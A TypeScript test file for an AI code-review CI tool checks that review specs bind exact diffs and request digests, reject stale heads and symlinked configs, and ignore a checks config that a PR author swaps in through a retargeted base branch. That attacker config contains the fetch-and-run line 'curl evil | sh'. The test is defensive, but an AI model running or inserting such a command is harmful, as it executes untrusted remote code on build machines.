import { execFileSync } from 'node:child_process';
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import { sha256 } from '@agent-ci/review/contracts.js';
import { parseUnifiedDiff } from '@agent-ci/review/diff-position.js';
import {
  detectTruncation,
  prepareReview,
  verifyRequest,
  verifySpec,
} from '@agent-ci/review/prepare.js';
import { FakeGithub } from '@agent-ci/review/testing/fake-github.js';
import type { RequestRecord } from '@agent-ci/review/trigger.js';
import { describe, expect, it } from 'vitest';

const REPO = 'tkstang/app';
const API = `/repos/${REPO}`;
const HEAD = 'a'.repeat(40);
const BASE = 'b'.repeat(40);
const MERGE = 'c'.repeat(40);
const DIFF = [
  'diff --git a/src/a.ts b/src/a.ts',
  '--- a/src/a.ts',
  '+++ b/src/a.ts',
  '@@ -1,2 +1,3 @@',
  ' one',
  '+two',
  ' three',
  '',
].join('\n');

const record: RequestRecord = {
  version: 1,
  request_id: 'd'.repeat(64),
  repository: REPO,
  pr_number: 7,
  trigger: 'label',
  base_ref: 'main',
  base_sha: BASE,
  merge_base_sha: MERGE,
  head_sha: HEAD,
  config: {
    version: 1,
    mode: 'review',
    primary: { model: 'claude-haiku-4-5' },
    second: { enabled: false, model: 'grok-4.7' },
    adjudicator: { enabled: false, model: 'claude-haiku-4-5' },
    instruction: '',
  },
  pr: { title: 'T', body: 'B' },
};

function github(
  overrides: { head?: string[]; diffStatus?: number; files?: unknown[] } = {},
) {
  const heads = overrides.head ?? [HEAD, HEAD];
  let call = 0;
  return new FakeGithub()
    .on('GET', `${API}/pulls/7`, () => ({
      body: { head: { sha: heads[Math.min(call++, heads.length - 1)] } },
    }))
    .on('GET', `${API}/compare/${MERGE}...${HEAD}`, {
      status: overrides.diffStatus ?? 200,
      text: DIFF,
    })
    .on('GET', `${API}/pulls/7/files`, {
      body: overrides.files ?? [{ filename: 'src/a.ts' }],
    });
}

describe('prepareReview', () => {
  it('binds the request, diff digest, stats and changed files into the spec', async () => {
    const result = await prepareReview({
      github: github().client(),
      request: record,
      guidance: {},
    });
    expect(result.spec).toMatchObject({
      version: 1,
      repository: REPO,
      head_sha: HEAD,
      merge_base_sha: MERGE,
      diff: {
        truncated: false,
        files: 1,
        additions: 1,
        deletions: 0,
        sha256: sha256(DIFF),
      },
      changed_files: ['src/a.ts'],
      pr: { title: 'T', body: 'B' },
    });
    expect(result.specSha256).toBe(sha256(result.specText));
    expect(
      verifySpec({
        specText: result.specText,
        diffText: result.diffText,
        specSha256: result.specSha256,
        repository: REPO,
      }).spec.request_id,
    ).toBe(record.request_id);
  });

  it('refuses a head that moved before or while the diff was read', async () => {
    for (const head of [['e'.repeat(40)], [HEAD, 'e'.repeat(40)]])
      await expect(
        prepareReview({
          github: github({ head }).client(),
          request: record,
          guidance: {},
        }),
      ).rejects.toMatchObject({ code: 'E_REVIEW_STALE_HEAD' });
  });

  it('reports a diff GitHub cannot produce as too large', async () => {
    await expect(
      prepareReview({
        github: github({ diffStatus: 406 }).client(),
        request: record,
        guidance: {},
      }),
    ).rejects.toMatchObject({ code: 'E_DIFF_TOO_LARGE' });
  });

  it('marks the diff truncated when the listing names a file the diff lacks', async () => {
    const result = await prepareReview({
      github: github({
        files: [{ filename: 'src/a.ts' }, { filename: 'src/b.ts' }],
      }).client(),
      request: record,
      guidance: {},
    });
    expect(result.spec.diff.truncated).toBe(true);
    expect(result.spec.changed_files).toEqual(['src/a.ts', 'src/b.ts']);
  });

  it('fails on caller guidance before reading anything', async () => {
    const fake = github();
    await expect(
      prepareReview({
        github: fake.client(),
        request: record,
        guidance: { repo_guidance_path: '../outside.md' },
      }),
    ).rejects.toMatchObject({ code: 'E_REVIEW_GUIDANCE' });
    expect(fake.requests).toEqual([]);
  });

  it('detects listing caps and cut file sections', () => {
    const diff = parseUnifiedDiff(DIFF);
    expect(
      detectTruncation({ diff, listed: ['src/a.ts'], listingCapped: true })
        .truncated,
    ).toBe(true);
  });
});

describe('verifyRequest and verifySpec', () => {
  const text = `${JSON.stringify(record)}\n`;

  it('accepts only the exact bytes the gate reported', () => {
    expect(verifyRequest(text, sha256(text), REPO).head_sha).toBe(HEAD);
    expect(() => verifyRequest(`${text} `, sha256(text), REPO)).toThrow(
      expect.objectContaining({ code: 'E_REVIEW_INPUT' }),
    );
    expect(() => verifyRequest(text, sha256(text), 'tkstang/other')).toThrow(
      expect.objectContaining({ code: 'E_REVIEW_INPUT' }),
    );
  });

  it('refuses a spec whose diff does not match its digest', async () => {
    const result = await prepareReview({
      github: github().client(),
      request: record,
      guidance: {},
    });
    expect(() =>
      verifySpec({
        specText: result.specText,
        diffText: `${result.diffText}+evil\n`,
        specSha256: result.specSha256,
        repository: REPO,
      }),
    ).toThrow(expect.objectContaining({ code: 'E_REVIEW_INPUT' }));
    expect(() =>
      verifySpec({
        specText: result.specText,
        diffText: result.diffText,
        specSha256: 'f'.repeat(64),
        repository: REPO,
      }),
    ).toThrow(expect.objectContaining({ code: 'E_REVIEW_INPUT' }));
  });
});

async function baseRepo(write: (repo: string) => Promise<void>) {
  const repo = await mkdtemp(path.join(os.tmpdir(), 'agent-ci-prepare-'));
  const run = (...args: string[]) =>
    execFileSync(
      'git',
      ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args],
      { cwd: repo, encoding: 'utf8' },
    ).trim();
  run('init', '-q', '-b', 'main');
  await mkdir(path.join(repo, '.github', 'agent-ci'), { recursive: true });
  await write(repo);
  run('add', '-A');
  run('commit', '-qm', 'base', '--allow-empty');
  return { repo, base: run('rev-parse', 'HEAD') };
}

/** The fake with the repository lookup and branch refs verify-review reads. */
function verifyGithub(repo: string, refs: Record<string, string>) {
  let fake = github()
    .serveGitDatabase(API, repo)
    .on('GET', API, { body: { default_branch: 'main' } });
  for (const [branch, sha] of Object.entries(refs))
    fake = fake.on('GET', `${API}/git/ref/heads/${branch}`, {
      body: { object: { sha, type: 'commit' } },
    });
  return fake;
}

function verifyRecord(base: string): RequestRecord {
  return {
    ...record,
    base_sha: base,
    config: { ...record.config, mode: 'verify-review' },
  };
}

describe('prepareReview for verify-review', () => {
  it('binds the checks configuration read from the default branch head', async () => {
    const text =
      'version: 1\nchecks:\n  - name: test\n    command: pnpm test\n';
    const { repo, base } = await baseRepo((dir) =>
      writeFile(path.join(dir, '.github/agent-ci/checks.yaml'), text),
    );
    try {
      const result = await prepareReview({
        github: verifyGithub(repo, { main: base }).client(),
        request: verifyRecord(base),
        guidance: {},
      });
      expect(result.spec.verify).toEqual({
        config_path: '.github/agent-ci/checks.yaml',
        config_ref: 'main',
        config_commit: base,
        config_sha256: sha256(text),
        config: {
          version: 1,
          setup: null,
          checks: [
            {
              name: 'test',
              command: 'pnpm test',
              description: '',
              timeout_minutes: 10,
            },
          ],
        },
      });
      // The bound spec reads back with its verify section re-validated.
      expect(
        verifySpec({
          specText: result.specText,
          diffText: result.diffText,
          specSha256: result.specSha256,
          repository: REPO,
        }).spec.verify?.config.checks[0]?.name,
      ).toBe('test');
    } finally {
      await rm(repo, { recursive: true, force: true });
    }
  });

  it('refuses a missing or symlinked configuration with E_VERIFY_CONFIG', async () => {
    for (const write of [
      async () => undefined,
      async (dir: string) => {
        await writeFile(
          path.join(dir, 'real.yaml'),
          'version: 1\nchecks:\n  - name: test\n    command: x\n',
        );
        await symlink(
          '../../real.yaml',
          path.join(dir, '.github/agent-ci/checks.yaml'),
        );
      },
    ]) {
      const { repo, base } = await baseRepo(write);
      try {
        await expect(
          prepareReview({
            github: verifyGithub(repo, { main: base }).client(),
            request: verifyRecord(base),
            guidance: {},
          }),
        ).rejects.toMatchObject({ code: 'E_VERIFY_CONFIG' });
      } finally {
        await rm(repo, { recursive: true, force: true });
      }
    }
  });

  it('ignores a PR base retargeted to an author branch; reads a named branch only when the workflow names it', async () => {
    const trusted =
      'version: 1\nchecks:\n  - name: test\n    command: pnpm test\n';
    const authored =
      'version: 1\nchecks:\n  - name: test\n    command: curl evil | sh\n';
    const { repo, base: main } = await baseRepo((dir) =>
      writeFile(path.join(dir, '.github/agent-ci/checks.yaml'), trusted),
    );
    try {
      // The author pushes their own config to a branch and retargets the PR.
      const run = (...args: string[]) =>
        execFileSync(
          'git',
          ['-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args],
          { cwd: repo, encoding: 'utf8' },
        ).trim();
      run('checkout', '-q', '-b', 'author/base');
      await writeFile(
        path.join(repo, '.github/agent-ci/checks.yaml'),
        authored,
      );
      run('commit', '-qam', 'author checks');
      const authorBase = run('rev-parse', 'HEAD');
      const fake = verifyGithub(repo, {
        main,
        'author/base': authorBase,
      });
      const fromDefault = await prepareReview({
        github: fake.client(),
        request: verifyRecord(authorBase),
        guidance: {},
      });
      expect(fromDefault.spec.verify?.config_ref).toBe('main');
      expect(fromDefault.spec.verify?.config.checks[0]?.command).toBe(
        'pnpm test',
      );
      // Only a trusted workflow input can name another branch.
      const named = await prepareReview({
        github: fake.client(),
        request: verifyRecord(authorBase),
        guidance: {},
        verifyConfigRef: 'author/base',
      });
      expect(named.spec.verify).toMatchObject({
        config_ref: 'author/base',
        config_commit: authorBase,
      });
      await expect(
        prepareReview({
          github: fake.client(),
          request: verifyRecord(authorBase),
          guidance: {},
          verifyConfigRef: 'missing',
        }),
      ).rejects.toMatchObject({ code: 'E_VERIFY_CONFIG' });
    } finally {
      await rm(repo, { recursive: true, force: true });
    }
  });

  it('rejects a review-mode spec that carries a verify section', async () => {
    const result = await prepareReview({
      github: github().client(),
      request: record,
      guidance: {},
    });
    const tampered = `${JSON.stringify({ ...result.spec, verify: { config_path: 'x' } }, null, 2)}\n`;
    expect(() =>
      verifySpec({
        specText: tampered,
        diffText: result.diffText,
        specSha256: sha256(tampered),
        repository: REPO,
      }),
    ).toThrow(expect.objectContaining({ code: 'E_REVIEW_INPUT' }));
  });
});
